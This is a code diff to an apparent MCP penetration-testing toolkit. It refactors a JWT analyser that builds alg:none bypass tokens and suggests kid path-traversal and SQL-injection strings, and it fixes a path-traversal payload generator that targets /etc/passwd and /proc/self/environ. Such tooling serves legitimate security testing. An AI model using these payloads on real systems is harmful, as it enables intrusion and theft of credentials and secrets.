@@ -128,8 +128,11 @@ def register(mcp: FastMCP):
         alg = header.get("alg", "unknown")
         lines.append(f"\nAlgorithm: {alg}")
 
-        # Check for vulnerabilities
-        vulns = []
+        # Real findings vs informational hints are tracked separately so the
+        # vuln count doesn't lie when there are no actual issues.
+        vulns: list[str] = []
+        notes: list[str] = []
+        tests: list[str] = []
 
         # alg:none
         if alg.lower() in ("none", ""):
@@ -137,15 +140,19 @@ def register(mcp: FastMCP):
 
         # Weak algorithms
         if alg in ("HS256", "HS384", "HS512"):
-            vulns.append(f"INFO: Symmetric algorithm ({alg}) — test with common secrets (secret, password, 123456)")
-            # Generate alg:none token
+            notes.append(f"Symmetric algorithm ({alg}) — test with common secrets (secret, password, 123456)")
+            # Generate alg:none bypass candidate
+            try:
+                exp_payload = parts[1]
+            except IndexError:
+                exp_payload = ""
             none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
-            none_token = f"{none_header}.{parts[1]}."
-            vulns.append(f"TEST: Try alg:none bypass token: {none_token}")
+            none_token = f"{none_header}.{exp_payload}."
+            tests.append(f"Try alg:none bypass token: {none_token}")
 
         # RS256 → HS256 confusion
         if alg in ("RS256", "RS384", "RS512"):
-            vulns.append(f"TEST: Algorithm confusion — try changing to HS256 and sign with public key")
+            tests.append("Algorithm confusion — try changing to HS256 and sign with public key")
 
         # JKU/X5U header injection
         if "jku" in header:
@@ -155,24 +162,24 @@ def register(mcp: FastMCP):
 
         # KID injection
         if "kid" in header:
-            vulns.append(f"TEST: kid parameter present ({header['kid']}) — test path traversal: ../../etc/passwd")
-            vulns.append(f"TEST: kid SQLi: ' UNION SELECT 'key'--")
+            tests.append(f"kid parameter present ({header['kid']}) — test path traversal: ../../etc/passwd")
+            tests.append("kid SQLi: ' UNION SELECT 'key'--")
 
-        # Check payload claims
+        # Check payload claims (notes, not vulns)
         exp = payload.get("exp")
-        if exp:
+        if isinstance(exp, (int, float)):
             if exp < time.time():
-                vulns.append(f"INFO: Token expired (exp: {exp})")
+                notes.append(f"Token expired (exp: {exp})")
             else:
                 remaining = int(exp - time.time())
-                vulns.append(f"INFO: Token expires in {remaining}s")
+                notes.append(f"Token expires in {remaining}s")
 
         if payload.get("admin") or payload.get("role") == "admin":
-            vulns.append(f"INFO: Token has admin privileges — test with modified non-admin token")
+            tests.append("Token has admin privileges — test with modified non-admin token")
 
         iss = payload.get("iss", "")
         if iss:
-            vulns.append(f"INFO: Issuer: {iss}")
+            notes.append(f"Issuer: {iss}")
 
         if vulns:
             lines.append(f"\nVulnerability Assessment ({len(vulns)}):")
@@ -180,6 +187,15 @@ def register(mcp: FastMCP):
                 lines.append(f"  {v}")
         else:
             lines.append("\nNo obvious vulnerabilities in token structure.")
+
+        if tests:
+            lines.append(f"\nFollow-up tests ({len(tests)}):")
+            for t in tests:
+                lines.append(f"  {t}")
+        if notes:
+            lines.append(f"\nNotes ({len(notes)}):")
+            for n in notes:
+                lines.append(f"  {n}")
 
         return "\n".join(lines)
 
@@ -548,7 +564,11 @@ def register(mcp: FastMCP):
             test_wrappers: Test PHP stream wrappers
             depth: Traversal depth
         """
-        depth = min(depth, 20)
+        # Clamp depth to a sane range — depth=0 produced "etc/passwd" with no
+        # traversal, silently sending a no-op probe.
+        depth = max(2, min(depth, 20))
+        # The "double-dot filter bypass" probe needs at least 2 segments.
+        double_dot_segments = max(1, depth // 2)
         payloads = []
         traversal = "../" * depth
 
@@ -558,7 +578,7 @@ def register(mcp: FastMCP):
                 (f"{traversal}etc/passwd", "linux", "Basic traversal"),
                 (f"{'..%2f' * depth}etc%2fpasswd", "linux", "URL-encoded slash"),
                 (f"{'..%252f' * depth}etc%252fpasswd", "linux", "Double URL-encoded"),
-                (f"{'....//..../' * (depth // 2)}etc/passwd", "linux", "Double-dot filter bypass"),
+                (f"{'....//..../' * double_dot_segments}etc/passwd", "linux", "Double-dot filter bypass"),
                 (f"{'..%c0%af' * depth}etc/passwd", "linux", "UTF-8 overlong encoding"),
                 ("/etc/passwd", "linux", "Absolute path"),
                 (f"{traversal}proc/self/environ", "linux", "Process environment"),
